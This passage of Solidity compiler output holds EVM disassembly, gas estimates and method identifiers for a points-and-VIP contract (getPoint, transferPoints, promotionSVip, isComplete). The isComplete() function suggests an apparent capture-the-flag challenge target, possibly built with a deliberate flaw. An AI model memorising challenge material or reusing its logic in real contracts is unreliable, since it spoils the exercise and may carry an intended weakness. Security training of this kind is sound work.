PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP DUP3 DUP2 ADD PUSH1 0x0 DUP1 DUP7 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 DUP2 SWAP1 SSTORE POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 MSTORE DUP1 PUSH1 0x0 MSTORE PUSH1 0x40 PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP2 POP SWAP1 POP SLOAD DUP2 JUMP JUMPDEST PUSH1 0x1 PUSH1 0x20 MSTORE DUP1 PUSH1 0x0 MSTORE PUSH1 0x40 PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP2 POP SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND DUP2 JUMP JUMPDEST PUSH1 0x64 PUSH1 0x2 SLOAD LT ISZERO ISZERO PUSH2 0x38B JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x1 PUSH1 0x0 DUP1 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 DUP3 DUP3 SLOAD ADD SWAP3 POP POP DUP2 SWAP1 SSTORE POP PUSH1 0x2 PUSH1 0x0 DUP2 SLOAD DUP1 SWAP3 SWAP2 SWAP1 PUSH1 0x1 ADD SWAP2 SWAP1 POP SSTORE POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x1 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH1 0xFF AND ISZERO ISZERO PUSH2 0x446 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x1 SWAP1 POP SWAP1 JUMP JUMPDEST PUSH2 0x3E7 PUSH1 0x0 DUP1 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 SLOAD LT ISZERO ISZERO ISZERO PUSH2 0x52B JUMPI PUSH1 0x40 MLOAD PUSH32 0x8C379A000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE PUSH1 0x4 ADD DUP1 DUP1 PUSH1 0x20 ADD DUP3 DUP2 SUB DUP3 MSTORE PUSH1 0x23 DUP2 MSTORE PUSH1 0x20 ADD DUP1 PUSH32 0x536F7272792C20796F7520646F6E2774206861766520656E6F75676820706F69 DUP2 MSTORE PUSH1 0x20 ADD PUSH32 0x6E74730000000000000000000000000000000000000000000000000000000000 DUP2 MSTORE POP PUSH1 0x40 ADD SWAP2 POP POP PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 REVERT JUMPDEST PUSH1 0x1 DUP1 PUSH1 0x0 CALLER PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 MSTORE PUSH1 0x20 ADD SWAP1 DUP2 MSTORE PUSH1 0x20 ADD PUSH1 0x0 KECCAK256 PUSH1 0x0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH1 0xFF MUL NOT AND SWAP1 DUP4 ISZERO ISZERO MUL OR SWAP1 SSTORE POP JUMP JUMPDEST PUSH1 0x2 SLOAD DUP2 JUMP STOP LOG1 PUSH6 0x627A7A723058 KECCAK256 0xe8 STATICCALL REVERT DUP15 COINBASE 0xbe TIMESTAMP SELFDESTRUCT RETURNDATASIZE SAR SELFDESTRUCT CALLER PUSH27 0x93CCE2CBD8709BF3FD67419CA36783A238B7130029000000000000 "
				},
				"gasEstimates": {
					"creation": {
						"codeDepositCost": "292400",
						"executionCost": "331",
						"totalCost": "292731"
					},
					"external": {
						"getPoint()": "40987",
						"isComplete()": "650",
						"isSuperVip(address)": "613",
						"numOfFree()": "526",
						"points(address)": "554",
						"promotionSVip()": "20920",
						"transferPoints(address,uint256)": "41114"
					}
				},
				"methodIdentifiers": {
					"getPoint()": "5bea9faa",
					"isComplete()": "b2fa1c9e",
					"isSuperVip(address)": "4095da72",
					"numOfFree()": "fab1512e",
					"points(address)": "358b8166",
					"promotionSVip()": "db78cdad",
					"transferPoints(address,uint256)": "326f823f"
				}
			},
			"userdoc": {
				"methods": {}
			}
		}
	}
}